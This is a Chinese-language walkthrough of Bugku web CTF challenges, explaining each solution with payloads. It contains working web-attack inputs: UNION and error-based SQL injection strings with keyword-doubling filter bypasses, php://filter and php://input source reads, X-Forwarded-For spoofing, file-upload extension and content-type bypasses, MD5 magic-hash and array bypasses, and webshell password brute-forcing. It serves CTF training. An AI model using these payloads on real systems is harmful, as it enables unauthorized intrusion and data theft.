# Bugku web练习

## web2

查看源代码即可看到flag



## 计算器

修改源码，使得可以输入正确答案的位数



## web基础$_GET

```
$what=$_GET['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';
```

GET请求，只要令变量what=flag就打印flag

```
?what=flag
```



## web基础$_POST

与上题类似，改变传参方式为post就好了

```
what=flag
```



## 矛盾

### 考点：强，弱类型比较

```
$num=$_GET['num'];
if(!is_numeric($num))
{
echo $num;
if($num==1)
echo 'flag{**********}';
}
```

要求不是数字，又要求输入为1才给flag

- **弱类型比较**，用的是两个等号==，如果等号两边类型不同，**会转换成相同类型再比较**。
- **强类型比较**，用的是三个等号===，**如果类型不同就直接不相等了**。

在弱类型比较下，当一个字符串与数字比较时，会把字符串转换成数字，具体是保留字母前的数字。例如123ab7c会转成123，ab7c会转成0.（字母前没数字就是0）

因此payload为：

```
?num=1xx
```



## web3

### 考点：html加密

抓个包，可以看到被注释的内容，用html解码就可以看到flag



## 域名解析

### 考点：域名解析

进入题目的IP地址，抓包修改host为题目要求的**flag.baidu.com**



## 你必须让他停下

bp抓包后，用repeater模块不断发包，就可以看见flag了



## 变量1

### 考点：文件包含漏洞

**可变变量**：var_dump($args)是执行输出命令(args)，里面的args是我们输入的变量，外面的$是再把这个输入当做变量。

**全局变量**：Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。

```php
<?php  
error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```

可以看到最上面用include包含了flag.php，这里就需要php的一点知识了全局变量global和$GLOBALS的区别

payload：

```
?args=GLOBALS
```



## web5

### 考点：JavaScript中的Jsfuck

[Jsfuck-- 一个很有意思的Javascript特性](https://www.jianshu.com/p/e7246218f424)

看到源代码是一堆**[]+!()**，看到提示为**JSPFUCK**，因此直接将括号复制到浏览器的控制台运行得到flag，注意全字母都要大写

```
CTF{WHATFK}
```



## 头等舱

抓包发现，flag在头部



## 网站被黑

### 考点：webshell，爆破

看到网站地址为：webshell，于是用工具进行扫描，发现有一个shell.php的网页，进入后发现为登录密码输入

于是找一个webshell的字典用bp爆破，密码为hack



## 管理员系统

### 考点：伪造内网访问

查看源码发现一个注释的内容很可疑

```
<!--dGVzdDEyMw==-->
进过base64解密后发现
test123		//应该为管理员密码，默认账号为admin
```

输入这一组账号密码，发现提示IP禁止访问，于是bp改包发送

```
X-Forwarded-For: 127.0.0.1		//添加在头部伪造成内网IP访问
```

得到flag



## web4

### 考点：URL解码

查看网页源码发现有一段被加密了，最后发现用URL进行解码

```
var p1 = 'function checkSubmit(){var a=document.getElementById("password");if("undefined"!=typeof a){if("67d709b2b';
var p2 = 'aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1}}document.getElementById("levelQuest").onsubmit=checkSubmit;';
eval(unescape(p1)   unescape('54aa2'   p2));
```

发现不完整，合并后发现如果我们提交的内容是67d709b2b54aa2aa648cf6e87a7114f1就可以得到flag



## flag在index里

### 考点：php://filter 伪类查看网页源码

题目提示flag在index中

**php://filter**可以**获取指定文件源码**。当与包含函数结合时，php://filter流会被当作php文件执行

**地址栏后填入：**

```
?file=php://filter/read=convert.base64-encode/resource=index.php	//填入需要打开的php文件
```

**返回值用bp的base64进行解码**，即可看到flag



## 输入密码查看flag

五位数字，直接进行暴力破解，最后密码为13579



## 点击一百万次



## 备份是个好习惯

### 考点：扫描网页文件，md5

发现后台有两个文件

- index.php
- index.php.bak

**注意：**备份文件一般情况是在后缀名后加的**\*.swp，*.bak**

地址栏输入访问，下载文件，去掉bak后缀打开

```php
<?php
/**
 * Created by PhpStorm.
 * User: Norse
 * Date: 2017/8/6
 * Time: 20:22
*/

include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```

要构造key1和key2两个变量，如果输入的**变量名中有“key”**，则会被**替换为空，**因此可以双写绕过

**要求**：key1和key2的值不同，但是md5的值相同

两种payload：

- 0e

  - 将key1和key2赋值成md5值为**0e开头的字符串**（0e0x10的n次方，会判定成相等）

  - 百度得这两个值为240610708和QNKCDZO，尝试赋值

  - ```
    ?kkeyey1=QNKCDZO&kkeyey2=240610708
    ```

- 数组

  - 由于md5无法处理数组，但php又不会报错，只会返回false，所以key1和key2可以**赋值乘数组**

  - ```
    ?kkeyey1[]=abc&kkeyey2[]=123
    ```



## 成绩单

### 考点：SQL注入

1. 判断回显位数，库名

   ```
   0' union select 1,database(),2,3#
   ```

   共四位，回显1，2，3，4位，库名为**skctf_flag**

2. 爆表

   ```
   0' union select 1,group_concat(table_name),2,3 from information_schema.tables where table_schema="skctf_flag"#
   ```

   表名为**fl4g**

3. 爆字段

   ```
   0' union select 1,group_concat(column_name),2,3 from information_schema.columns where table_name="fl4g"#
   ```

   字段为skctf_flag

4. 爆值

   ```
   0' union select 1,skctf_flag,2,3 from fl4g#
   ```

   

## 秋名山老司机

### 考点：脚本使用

题目需要我们在2s内计算结果，并且上传到服务器。这里我们用python

```python
import requests
import re										//导入相关模块

url = "http://123.206.87.240:8002/qiumingshan/"
s = requests.session()								//使会话保持，可以跨请求保持某些参数
htmlsource = s.get(url).text						//提取文字
exp = re.search(r'(\d+[+\-*])+(\d+)', htmlsource).group()
post = {'value':eval(exp)}							//执行字符串表达式，并返回值
a = s.post(url,data=post)							//post请求
print(a.text)
```



## 速度要快

### 考点：脚本使用

抓包发现包里有flag，并且测试后发现有两次base64加密

并且有提示，所以，**提交的数据包的值是margin**就对了：

> <!-- OK ,now you have to post the margin what you find -->

发现，每一次刷新都会改变flag的值，照着上一题改一改就好了

```python
import requests
import re
import base64

url = "http://123.206.87.240:8002/web6/"
r = requests.session()			//
content = r.post(url)
base = content.headers['flag'][-12:]
flag = base64.b64decode(base64.b64decode(base))
dic = {'margin':flag}
html = r.post(url,data=dic)		//post方式传递margin
print (html.text)
```



## cookies欺骗

### 考点：修改cookies

观察URL后，发现filename的值被加密过，`filename=a2V5cy50eHQ=`，解密后的编码为：`keys.txt`，因此我们需要读取到这个文件内容

使用python脚本

```php
import requests
url = 'http://123.206.87.240:8002/web11/index.php'
s = requests.Session()
for i in range(1,30):   									//读取前30行
    payloads = {'line':str(i),'filename':'aW5kZXgucGhw'} 	//构造
    a = s.get(url,params=payloads).content
    c = str(a,encoding="utf-8")
    print(c)
```

查看文件内容

```php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
$file_list = array(
'0' =>'keys.txt',
'1' =>'index.php',
);

if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
$file_list[2]='keys.php';
}


if(in_array($file, $file_list)){
$fa = file($file);
echo $fa[$line];
}
?>
```

发现，`$_COOKIE['margin']=='margin'`

当访问`keys.php`这个文件时，如果**Cookie**的值为`margin=margin`，就可以得到flag

因此，我们需要构造一个数据包，访问keys.php，并且Cookie的值为margin=margin

- keys.php的base64为：a2V5cy5waHA=
- 文件头添加Cookie：Cookie:margin=margin



![img](https://upload-images.jianshu.io/upload_images/8507748-dc02390b3110d28c.png?imageMogr2/auto-orient/strip|imageView2/2/w/854/format/webp)

## never give  up

### 考点：重定向

查看源代码发现又一个注释，因此访问这个文件，发现跳转到论坛

> <!--1p.html-->

因此，在进入1p.html后，直接跳到了论坛，导致我们并没有看到1p.html的内容

抓包修改，查看内容

![bugku 1](E:\学习笔记\markdown works\暑期培训\images\bugku 1.png)

这段内容被加密了，最后用**URL解出了部分内容**，看到会直接跳转到论坛，但还有一段被加密了

![bugku 1](E:\学习笔记\markdown works\暑期培训\images\bugku2.png)

使用base64解码后，再进行URL进行解码

```php
<!--";
if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("f4l2a3g.txt");
}
else
{
	print "never never never give up !!!";
}

?>-->
```

尝试直接访问`f4l2a3g.txt`文件，发现直接得到flag



其实，应该构造变量得到flag

我们需要构造id、a、b三个变量，要求

- !$_GET['id']，条件为假；同时id==0
- $data=bugku is a nice plateform!
- strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4

看了看网上的payload：

```
http://123.206.87.240:8006/test/hello.php?id=aaa&a=data://,bugku%20is%20a%20nice%20plateform!&b
```

id使用php弱类型进行绕过，!aaa \==> 0 & aaa==0 ==> ture

$data，利用php伪协议赋值

利用eregi()函数b=%00999999999



## 字符？正则？

### 考点：正则匹配

可以看到源码

```php
<?php 
highlight_file('2.php');
$key='KEY{********************************}';
$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
if( $IM ){ 
  die('key is: '.$key);
}
?> 
```

正则分析

```
"."：匹配除“\n”之外的任何单个字符
"*"：匹配前面的子表达式零次或多次
[[:punct:]]：匹配其中一个字符： !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
{4-7}：{n,m},m和n均为非负整数，其中n<=m。最少匹配n次且最多匹配m次
```



需要我们构造一个变量id

```
?id=key111key1111key:/1/111keya!
```



## 你从哪里来

### 考点：HTTP_REFERER

> HTTP Referer是head**header**的一部分，当浏览器向**web服务器**发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的

网页提示，`are you from google?`，因此我们添加**Referer**

```
Referer:https://www.google.com
```



## md5 collision(NUPT_CTF)

### 考点：MD5碰撞

题目提示传入一个a

> please input a

payload

```
?a=s878926199a
```



MD5碰撞列表

```
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
  
s214587387a
0e848240448830537924465865611904
  
s214587387a
0e848240448830537924465865611904
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675
  
s1885207154a
0e509367213418206700842008763514
```



## 程序员本地网站

### 考点：伪造内网访问

**X-Forwarded-For**（**XFF**）是用来识别通过**HTTP代理**或负载均衡方式连接到Web服务器的客户端最原始的**IP地址的HTTP请求头字段**

就是让服务器误以为我们是在内网进行访问

header头部添加

```
X-Forwarded-For: 127.0.0.1
```



## 各种绕过

### 考点：绕过

```php
<?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';

if (isset($_GET['uname']) and isset($_POST['passwd'])) {
    if ($_GET['uname'] == $_POST['passwd'])
        print 'passwd can not be uname.';
    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))
        die('Flag: '.$flag);
    else
        print 'sorry!';
}
?> 
```

绕过：

- 三个参数，id，uname（需要GET传参）、passwd（需要POST传参）
- id=margin
- 要求uname和passwd的值不相等
- uname和passwd的sha1值相等
- 由于sha1无法处理数组，但php又不会报错，只会返回false，所以uname和passwd可以**赋值乘数组**

payload：

```
?uname[]=abc&id=margin

//post传参：passwd[]=123
```



## web8

### 考点：伪协议 php://input

file_get_contents：将整个文件读入一个字符串

php://input：可以访问请求的原始数据的只读流

```php
<?php
extract($_GET);
if (!empty($ac))
{
	$f = trim(file_get_contents($fn));
	if ($ac === $f)
	{
		echo "<p>This is flag:" ." $flag</p>";
	}
	else
	{
	echo "<p>sorry!</p>";
	}
}
?>
```

- 变量ac不为空
- $ac === $f，而$f的值从文件$fn中获取

改包发送，payload：

```
?ac=1&fn=php://input

//post传参：1
```



## 求getshell

### 考点：文件上传漏洞

需要绕过才可以上传：

- 文件名filename=*.php5
- 文件类型Content-Type: image/jpeg（任一图片格式就行）
- 数据包类型Content-Type: multipart/form-datA #大小写绕过

payload：

![bugku 1](E:\学习笔记\markdown works\暑期培训\images\bugku3.png)





## 多次

### 考点：sql注入，双写绕过，报错注入

被过滤的字符串有：and，or，union，select

### 检测绕过字符的方法

异或注入法，**两个条件相同（同真或同假）即为假**。

```
?id=1'^(length('union')!=0)--+
```

如果返回页面显示正常，那就证明length(‘union’)==0的，也就是union被过滤了



**爆数据库**

注意：information里面也有or记得绕过

```
?id=0' ununionion seselectlect 1,group_concat(schema_name)from(infoorrmation_schema.schemata) --+
```

**爆表**：flag1

```
?id=0' ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+
```

**爆字段**：flag1

```
?id=0' ununionion seselectlect 1, group_concat(column_name) from infoorrmation_schema.columns where table_name='flag1'--+
```

**爆值**

有两个值，一起爆一下

```
?id=0' ununionion seselectlect 1,group_concat(flag1) from flag1--+
```

> usOwycTju+FTUUzXosjr

```
?id=0' ununionion seselectlect 1,group_concat(address) from flag1--+
```

> ./Once_More.php
> [下一关地址](http://123.206.87.240:9004/Once_More.php?id=1)



发现还有一个SQL注入，测试发现需要报错注入

**爆库**

web1002-2

```
?id=1'or updatexml(1, concat('~',database()), 1) --+
```

**爆表**

class,flag2

```
?id=1' or updatexml(1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'), 1) --+
```

**爆字段**

flag2,address

```
?id=1' or updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag2'),'~'), 1) --+
```

**爆值**

```
?id=1' or updatexml(1, concat('~',(select group_concat(flag2) from flag2),'~'), 1) --+
```



## flag.php

### 考点：序列化字符串，序列化漏洞 

根据提示，hint。用GET传参，看到代码

```
?hint=1
```

发现需要传入的cookie参数的值，反序列化后等于KEY就输出Flag

```php
<?php
error_reporting(0);
include_once("flag.php");
$cookie = $_COOKIE['ISecer'];
if(isset($_GET['hint'])){
    show_source(__FILE__);
}
elseif (unserialize($cookie) === "$KEY")
{   
    echo "$flag";
}
else {
?>

    
#提示    
<?php
}
$KEY='ISecer:www.isecer.com';
?>
```



抓包，增加cookie

```
cookie:ISecer=s:0:"";
```



### PHP序列化和反序列化解释

对象的创建的时候被存储到内存里，在解析的时候被销毁，如果机器重启，那么对象也将被销毁在新建。想要保存对象或者将对象传给另一台机器，就需要将对象串行化（序列化）；或者在需要存储数据到mysql等数据库中时需要系列化。

- **序列化（串行化）**：是将变量转换为可保存或传输的字符串的过程；

- **反序列化（反串行化）**：就是在适当的时候把这个字符串再转化成原来的变量使用。



#### serialize和unserialize函数

这两个是序列化和反序列化PHP中数据的常用函数



```php
<?php
$a = array('a' => 'Apple' ,'b' => 'banana' , 'c' => 'Coconut');
  
//序列化数组
$s = serialize($a);
echo $s;
//输出结果：a:3:{s:1:"a";s:5:"Apple";s:1:"b";s:6:"banana";s:1:"c";s:7:"Coconut";}
echo '<br /><br />';
 
//反序列化
$o = unserialize($s);
print_r($o);
//输出结果 Array ( [a] => Apple [b] => banana [c] => Coconut )
?>
```



## Trim的日记本

### 考点：扫描后台

开始以为是SQL注入的题目，可发现数据无法传入，御剑扫描后发现三个网页，发现show.php直接就把flag给了。。。